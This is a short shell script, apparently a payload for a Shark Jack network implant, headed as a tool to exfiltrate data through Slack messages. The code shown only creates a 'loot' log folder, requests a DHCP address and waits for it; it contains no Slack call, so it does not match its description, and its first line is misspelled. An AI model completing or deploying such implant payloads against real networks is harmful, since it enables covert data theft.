#!/bin/bh
# Title:         Slack
# Description:   Exfiltrate data with slack message
# Author:        Jules Bozouklian - bozou_client
# Version:       1.0
# Category:      Exfiltrate
#
# LED SETUP (Magenta)... Setting logs and waiting for IP address from DHCP
#

LOG_DIR=/root/loot/exiltrate/slack
TIMESTAMP=`date +"%Y-%m-%d"`

LED SETUP

NETMODE DHCP_CLIENT

# Make log file
mkdir -p $LOG_DIR
LOG_FILE=$TIMESTAMP"_$(find $LOG_DIR -type f | wc -l).log"
LOG="$LOG_DIR/$LOG_FILE"

# Wait until Shark Jack has an IP address
while [ -z "$IPADDR" ]; do sleep 1 && IPADDR=$(ifconfig eth0 | grep "inet addr"); done

SUCCESS
